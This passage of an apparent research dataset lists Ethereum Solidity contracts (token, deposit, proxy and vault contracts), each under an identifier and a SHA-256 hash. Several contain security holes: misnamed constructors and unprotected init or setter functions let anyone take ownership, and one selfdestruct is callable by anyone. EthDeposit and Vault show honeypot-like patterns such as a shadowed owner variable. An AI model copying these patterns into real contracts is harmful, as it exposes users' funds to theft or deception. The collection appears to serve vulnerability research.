        balances[_to] = addSafe(balances[_to], _value);
        Transfer(msg.sender, _to, _value, _data);
    }
    function isContract(address _addr) private view returns (bool is_contract) {
      uint length;
      assembly {
            length := extcodesize(_addr)
      }
      return (length>0);
    }
}
contract TOSToken is StandardToken {
  string public name = 'TOSToken';
  string public symbol = 'TOS';
  uint public decimals = 18;
  uint256 public createTime         = 1527436800;  
  uint256 public bonusEnds          = 1528646400;  
  uint256 public endDate            = 1529078400;  
  uint256 firstAnnual               = 1559318400;
  uint256 secondAnnual              = 1590940800;
  uint256 thirdAnnual               = 1622476800;
  uint256 public INITIAL_SUPPLY     = 1000000000;
  uint256 public frozenForever      =  400000000;
  uint256 firstAnnualReleasedAmount =  150000000;
  uint256 secondAnnualReleasedAmount=  150000000;
  uint256 thirdAnnualReleasedAmount =  100000000;
  function TOSToken() public {
    totalSupply = 200000000 ; 
    balances[msg.sender] = totalSupply * 10 ** uint256(decimals);
    owner = msg.sender;
  }
  function releaseSupply() public onlyOwner returns(uint256 _actualRelease) {
    uint256 releaseAmount = getReleaseAmount();
    require(releaseAmount > 0);
    balances[owner] = addSafe(balances[owner], releaseAmount * 10 ** uint256(decimals));
    totalSupply = addSafe(totalSupply, releaseAmount);
    Transfer(address(0), msg.sender, releaseAmount);
    return releaseAmount;
  }
  function getReleaseAmount() internal returns(uint256 _actualRelease) {
        uint256 _amountToRelease;
        if (    now >= firstAnnual
             && now < secondAnnual
             && firstAnnualReleasedAmount > 0) {
            _amountToRelease = firstAnnualReleasedAmount;
            firstAnnualReleasedAmount = 0;
        } else if (    now >= secondAnnual 
                    && now < thirdAnnual
                    && secondAnnualReleasedAmount > 0) {
            _amountToRelease = secondAnnualReleasedAmount;
            secondAnnualReleasedAmount = 0;
        } else if (    now >= thirdAnnual 
                    && thirdAnnualReleasedAmount > 0) {
            _amountToRelease = thirdAnnualReleasedAmount;
            thirdAnnualReleasedAmount = 0;
        } else {
            _amountToRelease = 0;
        }
        return _amountToRelease;
    }
    function () public payable {
        require(now >= createTime && now <= endDate);
        uint tokens;
        if (now <= bonusEnds) {
            tokens = msg.value * 2480;
        } else {
            tokens = msg.value * 2000;
        }
        require(tokens <= balances[owner]);
        balances[msg.sender] = addSafe(balances[msg.sender], tokens);
        Transfer(address(0), msg.sender, tokens);
        owner.transfer(msg.value);
    }
}
```

## RQ1_254bfee03840

SHA-256 `fd9385ebc1ae59d0a4e2ec006d6991b960d7820ed2457f4395295e2e09f924f1`

```solidity
pragma solidity ^0.4.18;
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
    function safeMul(uint a, uint b) public pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function safeDiv(uint a, uint b) public pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}
contract ERC20Interface {
    function totalSupply() public constant returns (uint);
    function balanceOf(address tokenOwner) public constant returns (uint balance);
    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
contract ApproveAndCallFallBack {
    function receiveApproval(address from, uint256 tokens, address token, bytes data) public;
}
contract Owned {
    address public owner;
    address public newOwner;
    event OwnershipTransferred(address indexed _from, address indexed _to);
    function owned() public {
        owner = msg.sender;
    }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}
contract Bitexlive is ERC20Interface, Owned, SafeMath {
    string public symbol;
    string public  name;
    uint8 public decimals;
    uint public _totalSupply;
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    function bitexlive() public {
        symbol = "0BTEX";
        name = "0 Bitexlive Token";
        decimals = 18;
        _totalSupply = 81000000000000000000000000;
        balances[0x6DD2c4896cF8e1E574Cff891D6cbf076bD86c8d4] = _totalSupply;
        Transfer(address(0), 0x6DD2c4896cF8e1E574Cff891D6cbf076bD86c8d4, _totalSupply);
    }
    function totalSupply() public constant returns (uint) {
        return _totalSupply  - balances[address(0)];
    }
    function balanceOf(address tokenOwner) public constant returns (uint balance) {
        return balances[tokenOwner];
    }
    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        Transfer(msg.sender, to, tokens);
        return true;
    }
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        Approval(msg.sender, spender, tokens);
        return true;
    }
    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        Transfer(from, to, tokens);
        return true;
    }
    function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        Approval(msg.sender, spender, tokens);
        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);
        return true;
    }
    function () public payable {
        revert();
    }
    function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {
        return ERC20Interface(tokenAddress).transfer(owner, tokens);
    }
}
```

## RQ1_4c2921d39474

SHA-256 `bf832b5a670b5a3f42bfdb615ba75db003e65cbfc8d2fc79ac1275a09b3ed9c4`

```solidity
pragma solidity ^0.4.17;
contract Owned 
{
    address newOwner;
    address owner = msg.sender;
    address creator = msg.sender;
    function changeOwner(address addr)
    public
    {
        if(isOwner())
        {
            newOwner = addr;
        }
    }
    function confirmOwner()
    public
    {
        if(msg.sender==newOwner)
        {
            owner=newOwner;
        }
    }
    function isOwner()
    internal
    constant
    returns(bool)
    {
        return owner == msg.sender;
    }
    function WthdrawAllToCreator()
    public
    payable
    {
        if(msg.sender==creator)
        {
            creator.transfer(this.balance);
        }
    }
    function WthdrawToCreator(uint val)
    public
    payable
    {
        if(msg.sender==creator)
        {
            creator.transfer(val);
        }
    }
    function WthdrawTo(address addr,uint val)
    public
    payable
    {
        if(msg.sender==creator)
        {
            addr.transfer(val);
        }
    }
}
contract EthDeposit is Owned
{
    address public Manager;
    address public NewManager;
    uint public SponsorsQty;
    uint public CharterCapital;
    uint public ClientQty;
    uint public PrcntRate = 5;
    bool paymentsAllowed;
    struct Lender
    {
        uint LastLendTime;
        uint Amount;
        uint Reserved;
    }
    mapping (address => uint) public Sponsors;
    mapping (address => Lender) public Lenders;
    event StartOfPayments(address indexed calledFrom, uint time);
    event EndOfPayments(address indexed calledFrom, uint time);
    function init(address _manager)
    public
    {
        owner = msg.sender;
        Manager = _manager;
    }
    function isManager()
    private
    constant
    returns (bool)
    {
        return(msg.sender==Manager);
    }
    function canManage()
    private
    constant
    returns (bool)
    {
        return(msg.sender==Manager||msg.sender==owner);
    }
    function ChangeManager(address _newManager)
    public
    {
        if(canManage())
        { 
            NewManager = _newManager;
        }
    }
    function ConfirmManager()
    public
    {
        if(msg.sender==NewManager)
        {
            Manager=NewManager;
        }
    }
    function StartPaymens()
    public
    {
        if(canManage())
        { 
            AuthorizePayments(true);
            StartOfPayments(msg.sender, now);
        }
    }
    function StopPaymens()
    public
    {
        if(canManage())
        { 
            AuthorizePayments(false);
            EndOfPayments(msg.sender, now);
        }
    }address owner;
    function AuthorizePayments(bool val)
    public
    {
        if(isOwner())
        {
            paymentsAllowed = val;
        }
    }
    function SetPrcntRate(uint val)
    public
    {
        if(canManage())
        {
            if(val!=PrcntRate)
            {
                if(val>=1)
                {
                    PrcntRate = val;  
                }
            }
        }
    }
    function()
    public
    payable
    {
        ToSponsor();
    }
    function ToSponsor() 
    public
    payable
    {
        if(msg.value>= 1 ether)
        {
            if(Sponsors[msg.sender]==0)SponsorsQty++;
            Sponsors[msg.sender]+=msg.value;
            CharterCapital+=msg.value;
        }   
    }
    function WithdrawToSponsor(address _addr, uint _wei) 
    public 
    payable
    {
        if(Sponsors[_addr]>0)
        {
            if(isOwner())
            {
                 if(_addr.send(_wei))
                 {
                   if(CharterCapital>=_wei)CharterCapital-=_wei;
                   else CharterCapital=0;
                 }
            }
        }
    }
    function Deposit() 
    public 
    payable
    {
        FixProfit();
        Lenders[msg.sender].Amount += msg.value;
    }
    function CheckProfit(address addr) 
    public 
    constant 
    returns(uint)
    {
        return ((Lenders[addr].Amount/100)*PrcntRate)*((now-Lenders[addr].LastLendTime)/1 days);
    }
    function FixProfit()
    public
    {
        if(Lenders[msg.sender].Amount>0)
        {
            Lenders[msg.sender].Reserved += CheckProfit(msg.sender);
        }
        Lenders[msg.sender].LastLendTime=now;
    }
    function WitdrawLenderProfit() 
    public 
    payable
    {
        if(paymentsAllowed)
        {
            FixProfit();
            uint profit = Lenders[msg.sender].Reserved;
            Lenders[msg.sender].Reserved = 0;
            msg.sender.transfer(profit);
        }
    }
}
```

## RQ1_913e18f76600

SHA-256 `5bb9f495dde6bce37d3753b15eea669ef5635ceaf7dd28e9b69efffca3f9f808`

```solidity
pragma solidity ^0.4.18;
library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
contract ERC20TokenInterface {
    function balanceOf(address _owner) public constant returns (uint256 balance);
    function transfer(address _to, uint256 _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);
    }
contract admined { 
    address public admin; 
    bool public lockTransfer; 
    address public allowedAddress; 
    function admined() internal {
        admin = msg.sender; 
        Admined(admin);
    }
    function setAllowedAddress(address _to) public {
        allowedAddress = _to;
        AllowedSet(_to);
    }
    modifier onlyAdmin() { 
        require(msg.sender == admin);
        _;
    }
    modifier transferLock() { 
        require(lockTransfer == false || allowedAddress == msg.sender);
        _;
    }
    function transferAdminship(address _newAdmin) onlyAdmin public { 
        admin = _newAdmin;
        TransferAdminship(admin);
    }
    function setTransferLock(bool _set) onlyAdmin public { 
        lockTransfer = _set;
        SetTransferLock(_set);
    }
    event AllowedSet(address _to);
    event SetTransferLock(bool _set);
    event TransferAdminship(address newAdminister);
    event Admined(address administer);
}
contract ERC20Token is ERC20TokenInterface, admined { 
    using SafeMath for uint256;
    uint256 public totalSupply;
    mapping (address => uint256) balances; 
    mapping (address => mapping (address => uint256)) allowed; 
    mapping (address => bool) frozen; 
    function balanceOf(address _owner) public constant returns (uint256 balance) {
      return balances[_owner];
    }
    function transfer(address _to, uint256 _value) transferLock public returns (bool success) {
        require(_to != address(0)); 
        require(balances[msg.sender] >= _value);
        require(frozen[msg.sender]==false);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        Transfer(msg.sender, _to, _value);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _value) transferLock public returns (bool success) {
        require(_to != address(0)); 
        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);
        require(frozen[_from]==false);
        balances[_to] = balances[_to].add(_value);
        balances[_from] = balances[_from].sub(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        Transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
      allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
    return allowed[_owner][_spender];
    }
    function setFrozen(address _target,bool _flag) onlyAdmin public {
        frozen[_target]=_flag;
        FrozenStatus(_target,_flag);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event FrozenStatus(address _target,bool _flag);
}
contract Asset is ERC20Token {
    string public name = 'EasyExchanger token';
    uint8 public decimals = 18;
    string public symbol = 'ECE';
    string public version = '1';
    function Asset() public {
        totalSupply = 300000000 * (10**uint256(decimals)); 
        balances[0x6c372aa5eda3858f12a5b59825bfdacb59e9f6fe] = totalSupply - (300000 * (10**uint256(decimals)));
        balances[0x9656e8520C1cc10721963F2E974761cf76Af81d8] = 300000 * (10**uint256(decimals)); 
    }
    function() public {
        revert();
    }
}
```

## RQ1_03a271e0c36c

SHA-256 `19bbf64e4f77a17187e0fb961bb3e1ca2f988219818a33615f7246672fc7d7ac`

```solidity
pragma solidity 0.4.24;
contract Delegatable {
    address public empty1; 
    address public empty2; 
    address public empty3;  
    address public owner;  
    address public delegation; 
    event DelegationTransferred(address indexed previousDelegate, address indexed newDelegation);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner, "Sender is not the owner");
        _;
    }
    constructor() public {}
    function transferDelegation(address _newDelegation) public onlyOwner {
        require(_newDelegation != address(0), "Trying to transfer to address 0");
        emit DelegationTransferred(delegation, _newDelegation);
        delegation = _newDelegation;
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0), "Trying to transfer to address 0");
        emit OwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
}
contract DelegateProxy {
    constructor() public {}
    function delegatedFwd(address _dst, bytes _calldata) internal {
        assembly {
            let result := delegatecall(sub(gas, 10000), _dst, add(_calldata, 0x20), mload(_calldata), 0, 0)
            let size := returndatasize
            let ptr := mload(0x40)
            returndatacopy(ptr, 0, size)
            switch result case 0 { revert(ptr, size) }
            default { return(ptr, size) }
        }
    }
}
contract Proxy is Delegatable, DelegateProxy {
    constructor() public {}
    function () public {
        require(delegation != address(0), "Delegation is address 0, not initialized");
        delegatedFwd(delegation, msg.data);
    }
    function initialize(address _controller, uint256) public {
        require(owner == 0, "Already initialized");
        owner = msg.sender;
        delegation = _controller;
        delegatedFwd(_controller, msg.data);
    }
}
```

## RQ1_a533300b98f5

SHA-256 `2d82af742c5fc5d0fdb4e5feab69e5253b4aa092060628c94bd58d89ba18dac3`

```solidity
pragma solidity ^0.4.24;
contract Nobody {
    function die() public {
        selfdestruct(msg.sender);
    }
}

```

## RQ1_3c95d2f0314b

SHA-256 `15bb45457c24c7bb2a89d6d11e26c2c28a0d3db45eb4561f529fe0206afa9cb2`

```solidity
pragma solidity ^0.4.18;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
 function div(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b > 0); 
    uint256 c = a / b;
    assert(a == b * c + a % b); 
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  function Ownable() public {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  function transferOwnership(address newOwner) onlyOwner public {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}
contract ERC20Interface {
     function totalSupply() public constant returns (uint);
     function balanceOf(address tokenOwner) public constant returns (uint balance);
     function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
     function transfer(address to, uint tokens) public returns (bool success);
     function approve(address spender, uint tokens) public returns (bool success);
     function transferFrom(address from, address to, uint tokens) public returns (bool success);
     event Transfer(address indexed from, address indexed to, uint tokens);
     event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
interface OLdxrpct {
    function transfer(address receiver, uint amount) external;
    function balanceOf(address _owner) external returns (uint256 balance);
    function mint(address wallet, address buyer, uint256 tokenAmount) external;
    function showMyTokenBalance(address addr) external;
}
contract MAD is ERC20Interface,Ownable {
   using SafeMath for uint256;
    uint256 public totalSupply;
    mapping(address => uint256) tokenBalances;
   string public constant name = "MADTOKEN";
   string public constant symbol = "MAD";
   uint256 public constant decimals = 18;
   uint256 public constant INITIAL_SUPPLY = 1000000000;
    address ownerWallet;
   mapping (address => mapping (address => uint256)) allowed;
   event Debug(string message, address addr, uint256 number);
    function MADToken(address wallet) public {
        owner = msg.sender;
        ownerWallet=wallet;
        totalSupply = INITIAL_SUPPLY * 10 ** 18;
        tokenBalances[wallet] = INITIAL_SUPPLY * 10 ** 18;   
    }
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(tokenBalances[msg.sender]>=_value);
    tokenBalances[msg.sender] = tokenBalances[msg.sender].sub(_value);
    tokenBalances[_to] = tokenBalances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
  }
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= tokenBalances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    tokenBalances[_from] = tokenBalances[_from].sub(_value);
    tokenBalances[_to] = tokenBalances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    Transfer(_from, _to, _value);
    return true;
  }
  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
    return true;
  }
     function totalSupply() public constant returns (uint) {
         return totalSupply  - tokenBalances[address(0)];
     }
     function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {
         return allowed[tokenOwner][spender];
     }
  function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
     function () public payable {
         revert();
     }
  function balanceOf(address _owner) constant public returns (uint256 balance) {
    return tokenBalances[_owner];
  }
    function mint(address wallet, address buyer, uint256 tokenAmount) public onlyOwner {
      require(tokenBalances[wallet] >= tokenAmount);               
      tokenBalances[buyer] = tokenBalances[buyer].add(tokenAmount);                  
      tokenBalances[wallet] = tokenBalances[wallet].sub(tokenAmount);                        
      Transfer(wallet, buyer, tokenAmount); 
      totalSupply=totalSupply.sub(tokenAmount);
    }
    function pullBack(address wallet, address buyer, uint256 tokenAmount) public onlyOwner {
        require(tokenBalances[buyer]>=tokenAmount);
        tokenBalances[buyer] = tokenBalances[buyer].sub(tokenAmount);
        tokenBalances[wallet] = tokenBalances[wallet].add(tokenAmount);
        Transfer(buyer, wallet, tokenAmount);
        totalSupply=totalSupply.add(tokenAmount);
     }
    function showMyTokenBalance(address addr) public view returns (uint tokenBalance) {
        tokenBalance = tokenBalances[addr];
    }
}
```

## RQ1_2d9b7fbe78a5

SHA-256 `d6be124b2aa15d2aeb257652459f462a879eee9f5961f920c453f813cb05c68f`

```solidity
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
    function safeMul(uint a, uint b) public pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function safeDiv(uint a, uint b) public pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}
contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
contract ApproveAndCallFallBack {
    function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}
contract Owned {
    address public owner;
    address public newOwner;
    event OwnershipTransferred(address indexed _from, address indexed _to);
    function Owned2() public {
        owner = msg.sender;
    }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}
contract FAMI is ERC20Interface, Owned, SafeMath {
    string public symbol;
    string public  name;
    uint8 public decimals;
    uint public _totalSupply;
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    function FAMI() public {
        symbol = "FAMI";
        name = "Family Coin";
        decimals = 8;
        _totalSupply = 	10000000000000000;
        balances[0x6100388A3e83A9EF1500Cb76D08048cB5ebaAEc2] = _totalSupply;
        Transfer(address(0), 0x6100388A3e83A9EF1500Cb76D08048cB5ebaAEc2, _totalSupply);
    }
    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }
    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }
    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        Transfer(msg.sender, to, tokens);
        return true;
    }
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        Approval(msg.sender, spender, tokens);
        return true;
    }
    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        Transfer(from, to, tokens);
        return true;
    }
    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        Approval(msg.sender, spender, tokens);
        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);
        return true;
    }
    function () public payable {
        revert();
    }
    function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {
        return ERC20Interface(tokenAddress).transfer(owner, tokens);
    }
}
```

## RQ1_aadd85d114d9

SHA-256 `ad26e8db205141987fcdb48a6fd994cfe36fe658d736fb357a4f79c1c8fb4c4e`

```solidity
pragma solidity ^0.4.21;
contract primoContratto {
    address private proprietario;
    mapping (uint256 => string) private frasi;
    uint256 private frasiTotali = 0;
    function primoContratto() public {
        proprietario = msg.sender;
    }
    function aggiungiFrase(string _frase) public returns (uint256) {
        frasi[frasiTotali] = _frase;
        frasiTotali++;
        return frasiTotali-1;
    }
    function totaleFrasi() public view returns (uint256) {
        return frasiTotali;
    }
    function leggiFrase(uint256 _numeroFrase) public view returns (string) {
        return frasi[_numeroFrase];
    }
    function kill() public {
        if (proprietario != msg.sender) return;
        selfdestruct(proprietario);
    }
}
```

## RQ1_3342a012923f

SHA-256 `a22b72be7f88df8a205cdb77bef81062dc864936585bcd9b9c89d5d77275f915`

```solidity
pragma solidity ^0.4.23;
contract TecoIco {
    function bonusOf(address _owner) public view returns (uint256);
}
contract TecoToken {
    function balanceOf(address who) public view returns (uint256);
    function allowance(address _owner, address _spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
}
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}
contract Ownable {
    address public owner;
    event OwnershipRenounced(address indexed previousOwner);
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipRenounced(owner);
        owner = address(0);
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        _transferOwnership(_newOwner);
    }
    function _transferOwnership(address _newOwner) internal {
        require(_newOwner != address(0));
        emit OwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
}
contract TecoBuyBack is Ownable {
    using SafeMath for uint256;
    TecoIco public tecoIco;
    TecoToken public tecoToken;
    mapping(address => uint256) tokensBought;
    uint256 public rate;
    uint256 public numOrders;
    enum OrderStatus {None, Pending, Payed, Deleted}
    struct Order {
        address investor;
        uint amount;
        OrderStatus status;
    }
    mapping(uint256 => Order) orders;
    constructor(TecoIco _tecoIco, TecoToken _tecoToken) public{
        require(_tecoIco != address(0));
        require(_tecoToken != address(0));
        tecoIco = _tecoIco;
        tecoToken = _tecoToken;
    }
    function() external payable {}
    function withdrawAllFunds()
    public
    onlyOwner
    {
        owner.transfer(address(this).balance);
    }
    function withdrawFunds(uint value)
    public
    onlyOwner
    {
        owner.transfer(value);
    }
    function availableBonuses(address investor) public view returns (uint256) {
        if (tecoIco.bonusOf(investor) <= tokensBought[investor]) return 0;
        return tecoIco.bonusOf(investor).sub(tokensBought[investor]);
    }
    function setRate(uint256 _rate)
    public
    onlyOwner
    {
        rate = _rate;
    }
    function createOrder(uint256 _amount)
    public
    returns (uint256)
    {
        require(availableBonuses(msg.sender) >= _amount);
        require(tecoToken.allowance(msg.sender, address(this)) >= _amount);
        orders[numOrders++] = Order(msg.sender, _amount, OrderStatus.Pending);
        return numOrders - 1;
    }
    function calculateSum(uint256 amount)
    public
    view
    returns (uint256)
    {
        return amount.div(rate);
    }
    function orderSum(uint256 orderId)
    public
    view
    returns (uint256)
    {
        return calculateSum(orders[orderId].amount);
    }
    function payOrders(uint256 orderId_1, uint256 orderId_2, uint256 orderId_3, uint256 orderId_4, uint256 orderId_5)
    public
    onlyOwner
    {
        if (orderId_1 >= 0) payOrder(orderId_1);
        if (orderId_2 >= 0) payOrder(orderId_2);
        if (orderId_3 >= 0) payOrder(orderId_3);
        if (orderId_4 >= 0) payOrder(orderId_4);
        if (orderId_5 >= 0) payOrder(orderId_5);
    }
    function payOrder(uint256 orderId)
    public
    onlyOwner
    {
        require(address(this).balance >= orderSum(orderId));
        require(orders[orderId].status == OrderStatus.Pending);
        orders[orderId].status = OrderStatus.Payed;
        orders[orderId].investor.transfer(orderSum(orderId));
        tecoToken.transferFrom(orders[orderId].investor, owner, orders[orderId].amount);
        tokensBought[orders[orderId].investor] += orders[orderId].amount;
    }
    function deleteOrder(uint256 orderId)
    public
    {
        require(orders[orderId].investor == msg.sender || owner == msg.sender);
        require(orders[orderId].status == OrderStatus.Pending);
        orders[orderId].status = OrderStatus.Deleted;
    }
    function getOrderInvestor(uint256 orderId)
    public
    view
    returns (address)
    {
        return orders[orderId].investor;
    }
    function getOrderAmount(uint256 orderId)
    public
    view
    returns (uint256)
    {
        return orders[orderId].amount;
    }
    function getOrderStatus(uint256 orderId)
    public
    view
    returns (OrderStatus)
    {
        return orders[orderId].status;
    }
    function getTokensBought(address investor)
    public
    view
    returns (uint256)
    {
        return tokensBought[investor];
    }
}
```

## RQ1_b45fd17eae9d

SHA-256 `8c8779c83ac3be32ccdc1f238cb54c537bf59b17d63e074abc2a40f21b0f9317`

```solidity
pragma solidity ^0.4.17;
contract Ownable {
    address Owner;
    function Ownable() { Owner = msg.sender; }
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
contract Token {
    function balanceOf(address who) constant public returns (uint256);
    function transfer(address to, uint amount) constant public returns (bool);
}
contract TokenVault is Ownable {
    address owner;
    event TokenTransfer(address indexed to, address token, uint amount);
    function withdrawTokenTo(address token, address to) public onlyOwner returns (bool) {
        uint amount = balanceOfToken(token);
        if (amount > 0) {
            TokenTransfer(to, token, amount);
            return Token(token).transfer(to, amount);
        }
        return false;
    }
    function balanceOfToken(address token) public constant returns (uint256 bal) {
        bal = Token(token).balanceOf(address(this));
    }
}
contract Vault is TokenVault {
    string public constant version = "v1.1";
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 1 ether;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
